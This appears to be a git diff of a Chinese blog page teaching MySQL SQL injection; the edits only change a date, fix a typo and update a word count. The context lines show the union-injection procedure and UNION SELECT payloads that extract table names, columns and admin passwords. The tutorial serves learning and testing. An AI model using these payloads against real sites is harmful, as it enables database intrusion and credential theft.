@@ -351,7 +351,7 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2020-04-14
+                    2020-04-20
                 </div>
                 
 
@@ -413,7 +413,7 @@
 <h3 id="获取当前数据库中的表"><a href="#获取当前数据库中的表" class="headerlink" title="获取当前数据库中的表"></a>获取当前数据库中的表</h3><p><code>select table_name from information_schema.tables where table_schema = database();</code></p>
 <h3 id="获取表中的列"><a href="#获取表中的列" class="headerlink" title="获取表中的列"></a>获取表中的列</h3><pre><code>select column_name from information_schema.columns where table_name = &#39;admin&#39;;</code></pre><h3 id="获取字段"><a href="#获取字段" class="headerlink" title="获取字段"></a>获取字段</h3><pre><code>select password from admin;</code></pre><h2 id="0x05-常见注入方式"><a href="#0x05-常见注入方式" class="headerlink" title="0x05 常见注入方式"></a>0x05 常见注入方式</h2><p>上面说了mysql的基本操作，下面会根据各种注入方式是如何来利用的。</p>
 <h3 id="union联合注入"><a href="#union联合注入" class="headerlink" title="union联合注入"></a>union联合注入</h3><p>union就是利用可以连接两个以上的select语句的特性来实行注入<br>通常的流程：<br>（1）利用order by （当order by后面的数字小于实际的列表数时，页面返回正常，当大于列表数时将会报错）判断当前列表数。<br><img src="/3724188629/1.png" alt><br>（2）判断回显的字段，就是查看那个字段可以在页面中看见，需要注意的时，要使得参数报错，我们才能获取回显的字段，从图中也可以看到，如果不使其参数报错，其实仍然还是正常的回显，这里是都可以看到回显的<br><img src="/3724188629/2.png" alt><br>（3）获取当前数据库的表信息<br>跟上面的大致一样，就直接放payload了</p>
-<pre><code>select * from admin where id = 0 union select group_concat(table_name),2,3 from information_schema.tables where table_schema = database();</code></pre><p><code>group_concay</code>是连接字符串函数，是为了是数据全都在一行显示出来，也可以用<code>limit x,1</code>来遍历获取<br><img src="/3724188629/3.png" alt><br>（4）获取表中的列</p>
+<pre><code>select * from admin where id = 0 union select group_concat(table_name),2,3 from information_schema.tables where table_schema = database();</code></pre><p><code>group_concat</code>是连接字符串函数，是为了是数据全都在一行显示出来，也可以用<code>limit x,1</code>来遍历获取<br><img src="/3724188629/3.png" alt><br>（4）获取表中的列</p>
 <pre><code>select * from admin where id = 0 union select group_concat(column_name),2,3 from information_schema.columns where table_name = &#39;admin&#39;;</code></pre><p>（5）获取字段</p>
 <pre><code>select * from admin where id = 0 union select group_concat(user),group_concat(password),3 from admin;</code></pre><p>union联合注入，算是回显注入，目前应该很少有了，大多是盲注</p>
 <h3 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h3><p>报错注入利用的是mysql中一些函数的错误使用会导致mysql信息回显，而这些回显信息中就包含我们构造的查询语句的返回结果</p>
@@ -915,7 +915,7 @@ code[class*="language-"], pre[class*="language-"] { white-space: pre !important;
         <div class="col s12 m8 l8 copy-right">
             
             &nbsp;苦逼博主已经肝了&nbsp;<span
-                class="white-color">38.6k</span>&nbsp;字
+                class="white-color">41.6k</span>&nbsp;字
             
             
             
